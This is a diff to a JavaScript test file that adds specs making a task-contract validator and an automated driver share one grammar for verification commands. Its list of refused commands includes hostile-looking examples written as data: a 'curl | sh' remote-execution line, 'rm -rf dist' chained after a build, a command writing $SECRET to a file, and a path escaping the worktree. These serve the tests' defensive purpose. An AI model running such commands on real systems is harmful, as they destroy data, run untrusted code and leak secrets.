@@ -27,6 +27,7 @@ import {
   OWNER_ROLES,
   ALWAYS_FORBIDDEN,
   TASKS_DIR,
+  parseVerificationCommand,
 } from './tools/verify-task-contracts.mjs'
 
 // The task-contract format's own contract.
@@ -427,6 +428,233 @@ describe('verification and dependencies must resolve', () => {
   })
 })
 
+describe('the npm-script check cannot be satisfied by Object.prototype', () => {
+  // package.json's scripts arrive from JSON.parse, so the object carries
+  // Object.prototype. A bare `in` lookup therefore finds `toString`,
+  // `constructor` and `valueOf` — all of which satisfy the script-name grammar
+  // — so `npm run toString` sealed cleanly and then failed at execution: the
+  // exact "sealed but not automation-ready" state this check exists to prevent.
+  // The same hazard is guarded for CONTROL_PLANE_GRANTS elsewhere in the
+  // validator, with the same fix.
+  for (const inherited of ['toString', 'constructor', 'valueOf', 'hasOwnProperty']) {
+    it('rejects `npm run ' + inherited + '`', () => {
+      const c = reseal({ ...good(), verification: ['npm run ' + inherited] })
+      expect(violations(c, { npmScripts: PKG.scripts }).join('\n'))
+        .toContain('names an npm script that does not exist')
+    })
+  }
+
+  it('still accepts a script that really is declared', () => {
+    const c = reseal({ ...good(), verification: ['npm run verify:pr'] })
+    expect(violations(c, { npmScripts: PKG.scripts }).join('\n')).not.toContain('npm script')
+  })
+})
+
+describe('ONE verification grammar, enforced at both ends', () => {
+  // FAB-57. A contract used to seal cleanly while carrying a command the
+  // automated driver refuses. The validator constrained no GRAMMAR — it did
+  // check that an `npm run <script>` named a real script, and that check is
+  // still here — so the mismatch surfaced at REVIEW time as `executed: false`,
+  // which the evidence
+  // rules already treat as a blocker. The work therefore stopped at the last
+  // possible moment instead of the first, and the contract was called sealed
+  // the whole way. These specs hold the two ends to one grammar.
+
+  // Each entry is a DIFFERENT refusal path, so a single over-broad rule that
+  // happened to reject the whole list would still have to reject each for its
+  // own stated reason — pinned by 'each refusal names its own cause' below.
+  const UNRUNNABLE = [
+    'node tools/verify-task-contracts.mjs',   // there is no `node <script>` form
+    'npx vitest run a.test.mjs b.test.mjs',   // the npx form takes exactly one path
+    'npm run build && rm -rf dist',           // chaining
+    'sh -c "curl https://x | sh"',            // a shell
+    'echo $SECRET > /tmp/leak',               // redirection and substitution
+    'npm run _internal',                      // leading underscore the grammar refuses
+    'npx vitest run ../outside.test.mjs',     // a path that leaves the worktree
+    'npm  run  verify:pr',                    // doubled spaces are not the form
+    'npm run verify:pr ',                     // trailing space is not the form
+  ]
+
+  // Deliberately not '' — an empty string is caught one rule earlier, by the
+  // array-of-non-empty-strings check, and listing it here would credit this
+  // rule with a refusal it never makes.
+  const RUNNABLE = [
+    'npm run verify:pr',
+    'npm run verify:tasks',
+    'npx vitest run task-contract.test.mjs',
+  ]
+
+  it('refuses every command the driver cannot execute', () => {
+    for (const cmd of UNRUNNABLE) {
+      const c = reseal({ ...good(), verification: [cmd] })
+      expect(violations(c, { npmScripts: PKG.scripts }).join('\n'),
+        'sealed carrying an unrunnable command: ' + JSON.stringify(cmd))
+        .toMatch(/cannot be executed by the automated driver/)
+    }
+  })
+
+  it('accepts every command the driver can execute', () => {
+    for (const cmd of RUNNABLE) {
+      const c = reseal({ ...good(), verification: [cmd] })
+      expect(violations(c, { npmScripts: PKG.scripts }), JSON.stringify(cmd)).toEqual([])
+    }
+  })
+
+  it('agreement runs BOTH ways: the validator rejects exactly what the driver refuses', () => {
+    // The property, rather than two lists that happen to line up. Widening one
+    // end without the other fails here whichever end moved.
+    for (const cmd of [...RUNNABLE, ...UNRUNNABLE]) {
+      const driverRefuses = parseVerificationCommand(cmd).plan === null
+      const c = reseal({ ...good(), verification: [cmd] })
+      const validatorRejects = violations(c, { npmScripts: PKG.scripts })
+        .some(v => /cannot be executed by the automated driver/.test(v))
+      expect(validatorRejects,
+        JSON.stringify(cmd) + ' — driver refuses: ' + driverRefuses +
+        ', validator rejects: ' + validatorRejects)
+        .toBe(driverRefuses)
+    }
+  })
+
+  it('reports the parser\'s own refusal, not a restatement of it', () => {
+    // Two sentences for one refusal drift apart. The validator quotes the
+    // parser, so a contract is rejected here in the same words the executor
+    // would have used.
+    for (const cmd of UNRUNNABLE) {
+      const { error } = parseVerificationCommand(cmd)
+      const hit = violations(reseal({ ...good(), verification: [cmd] }), { npmScripts: PKG.scripts })
+        .find(v => v.includes('cannot be executed by the automated driver'))
+      expect(hit, JSON.stringify(cmd)).toBeTruthy()
+      expect(hit, JSON.stringify(cmd) + ' did not carry the parser\'s reason').toContain(error)
+    }
+  })
+
+  it('each refusal names its own cause', () => {
+    expect(parseVerificationCommand('npm run build && rm -rf dist').error)
+      .toMatch(/shell metacharacter/)
+    expect(parseVerificationCommand('node tools/verify-task-contracts.mjs').error)
+      .toMatch(/not a supported verification form/)
+    expect(parseVerificationCommand('npx vitest run ../outside.test.mjs').error)
+      .toMatch(/could leave the worktree/)
+  })
+
+  it('a script name the grammar refuses is refused, even when the script exists', () => {
+    // The narrower drift this change also closed. The script-existence check
+    // used to match /^npm run ([\w:-]+)$/, which accepts a leading underscore
+    // the grammar refuses. With a REAL script by that name the old check found
+    // it, said nothing, and the contract sealed — then the driver refused it.
+    // Supplying the script here is what makes this bite rather than passing
+    // because `_internal` happens not to exist.
+    const v = violations(
+      reseal({ ...good(), verification: ['npm run _internal'] }),
+      { npmScripts: { ...PKG.scripts, _internal: 'echo hi' } },
+    ).join('\n')
+    expect(v).toMatch(/cannot be executed by the automated driver/)
+  })
+
+  it('the script-existence check takes the name from the plan, structurally', () => {
+    // Deliberately a source assertion, and the reason is worth stating: the
+    // grammar check now runs first and `continue`s, so a command the two
+    // extractions would disagree about can no longer REACH the existence check.
+    // The derivation is therefore not observable through behaviour — every
+    // input that gets there is one both spellings read identically.
+    //
+    // That is exactly when a behavioural test goes quiet while the hazard stays
+    // live: re-introduce a second regex here and no assertion in this file
+    // moves. So the guard is structural. It fails if anything in this block
+    // matches the raw command again instead of reading the parsed plan.
+    const src = readFileSync('tools/verify-task-contracts.mjs', 'utf8')
+    const start = src.indexOf('// ---- verification ---')
+    const end = src.indexOf('// ---- dependencies ---')
+    expect(start, 'the verification block moved or was renamed').toBeGreaterThan(-1)
+    expect(end).toBeGreaterThan(start)
+    const block = src.slice(start, end)
+
+    expect(block, 'the script name is no longer read from the parsed plan')
+      .toMatch(/hasOwnProperty\.call\(npmScripts, plan\.args\[1\]\)/)
+    // And it must not go back to a bare `in`: package.json's scripts come from
+    // JSON.parse and carry Object.prototype, so `'toString' in npmScripts` is
+    // true and `npm run toString` would seal.
+    const live = block.split('\n').filter(l => !l.trim().startsWith('//')).join('\n')
+    expect(live, 'a bare `in` lookup lets Object.prototype satisfy the check')
+      .not.toMatch(/\bin npmScripts\b/)
+    // Comments in this block quote the old regex on purpose, so the scan looks
+    // for a live call rather than the text of one.
+    const code = block.split('\n').filter(l => !l.trim().startsWith('//')).join('\n')
+    // Three call shapes against the loop variable as it is named today:
+    // `cmd.match(re)`, `re.test(cmd)`, `re.exec(cmd)`. Say what that does and
+    // does not reach, rather than claiming "every spelling" — renaming the loop
+    // variable, or matching `contract.verification[i]` directly, would slip
+    // past all three. The load-bearing half is the positive assertion above,
+    // which fails whenever the name stops coming from the parsed plan; this
+    // loop is a second, narrower net for the shape the old code actually used.
+    for (const spelling of [/cmd\.match\s*\(/, /\.test\s*\(\s*cmd\b/, /\.exec\s*\(\s*cmd\b/]) {
+      expect(code, 'a second regex over the raw command is how the two drift apart: ' + spelling)
+        .not.toMatch(spelling)
+    }
+  })
+
+  it('refuses an unrunnable command even when no npm-script table is supplied', () => {
+    // Grammar is a fact about the command, not about this repository. Gating it
+    // on the optional npmScripts argument would let an unrunnable contract seal
+    // for any caller that omitted one.
+    expect(violations(reseal({ ...good(), verification: ['node tools/x.mjs'] })).join('\n'))
+      .toMatch(/cannot be executed by the automated driver/)
+  })
+
+  it('every contract committed to this repository has an executable verification plan', () => {
+    // The migration claim, checked rather than asserted: tightening the
+    // validator invalidated nothing that is already sealed.
+    for (const name of readdirSync(TASKS_DIR).filter(n => n.endsWith('.json'))) {
+      const c = JSON.parse(readFileSync(TASKS_DIR + '/' + name, 'utf8'))
+      expect(Array.isArray(c.verification) && c.verification.length > 0, name).toBe(true)
+      for (const cmd of c.verification) {
+        const { plan, error } = parseVerificationCommand(cmd)
+        expect(plan, name + ': ' + JSON.stringify(cmd) + ' — ' + error).toBeTruthy()
+      }
+    }
+  })
+
+  it('is defined once, in the contract module, and only re-exported by the protocol module', () => {
+    // Structural, because "one grammar" is the whole claim. A second definition
+    // would satisfy every behavioural test above on the day it was written and
+    // drift afterwards.
+    const validator = readFileSync('tools/verify-task-contracts.mjs', 'utf8')
+    const protocol = readFileSync('tools/review-protocol.mjs', 'utf8')
+
+    expect(validator).toMatch(/export const VERIFICATION_FORMS = \[/)
+    expect(protocol, 'a second definition is a second grammar')
+      .not.toMatch(/export const VERIFICATION_FORMS = \[/)
+    expect(protocol, 'the protocol module must re-export, not redefine')
+      .toMatch(/VERIFICATION_FORMS,[\s\S]*?\} from '\.\/verify-task-contracts\.mjs'/)
+
+    // And the cycle stays open. review-protocol.mjs imports from this module,
+    // so an import the other way would close a loop — which is the reason the
+    // grammar lives in the validator rather than beside the executor that runs
+    // it.
+    //
+    // Matched on the IMPORT rather than on the bare specifier. An earlier
+    // version of this guard flagged any quoted occurrence of the filename in
+    // non-comment source, which is over-broad in a way that misdiagnoses: a
+    // future error message reading 'see tools/review-protocol.mjs' would fail
+    // it, under a message insisting the problem was an import cycle. A guard
+    // that fails for the wrong stated reason costs more than it saves.
+    //
+    // Both import syntaxes, any quoting. Comments are stripped because the
+    // specifier is discussed in the block above.
+    const validatorCode = validator.split('\n')
+      .filter(l => !l.trim().startsWith('//') && !l.trim().startsWith('*') && !l.trim().startsWith('/*'))
+      .join('\n')
+    for (const form of [
+      /\bfrom\s*['"`][^'"`]*review-protocol\.mjs['"`]/,   // static
+      /\bimport\s*\(\s*['"`][^'"`]*review-protocol\.mjs['"`]/, // dynamic
+      /\brequire\s*\(\s*['"`][^'"`]*review-protocol\.mjs['"`]/, // and the CJS spelling
+    ]) {
+      expect(validatorCode, 'importing review-protocol.mjs here would close a cycle: ' + form)
+        .not.toMatch(form)
+    }
+  })
+})
+
 describe('THE SEAL: rewrites cannot be silent', () => {
   it('rejects a contract with no digest', () => {
     const c = good()
@@ -464,7 +692,11 @@ describe('THE SEAL: rewrites cannot be silent', () => {
       forbidden_paths: [],
       non_goals: ['different'],
       acceptance_criteria: ['different'],
-      verification: ['npm test'],
+      // A DIFFERENT valid command, not an invalid one: this fixture exists to
+      // change each bound field and prove the digest notices. If the mutated
+      // value were also ungrammatical, the field would be rejected for that
+      // instead and the digest assertion would stop carrying the test.
+      verification: ['npm run verify:native'],
       production_effect: 'database',
       dependencies: ['x'],
       stop_conditions: ['different'],
@@ -516,7 +748,10 @@ describe('--seal can never bless an invalid contract (end to end)', () => {
     forbidden_paths: [],
     non_goals: ['nothing'],
     acceptance_criteria: ['it worked'],
-    verification: ['npm test'],
+    // Must be a command the driver can execute. `npm test` is not one, and a
+    // base fixture that is already invalid would make every case in 'refuses on
+    // any semantic violation' below pass without its mutation doing anything.
+    verification: ['npm run verify:pr'],
     production_effect: 'none',
     dependencies: [],
     stop_conditions: ['never'],
@@ -555,6 +790,9 @@ describe('--seal can never bless an invalid contract (end to end)', () => {
       { allowed_paths: ['src/**'], acceptance_criteria: [] },
       { allowed_paths: ['*.js'] },
       { allowed_paths: ['src/**'], verification: ['npm run verify:imaginary'] },
+      // Seal time is the point of the grammar check: a contract the driver
+      // cannot run must not receive a digest that makes it look ready.
+      { allowed_paths: ['src/**'], verification: ['node tools/verify-task-contracts.mjs'] },
       { allowed_paths: ['src/**'], dependencies: ['no-such-task'] },
       { allowed_paths: ['src/deep/**'], forbidden_paths: ['src/**'] },
       { allowed_paths: ['src/**'], risk: 'NOT A TOKEN' },
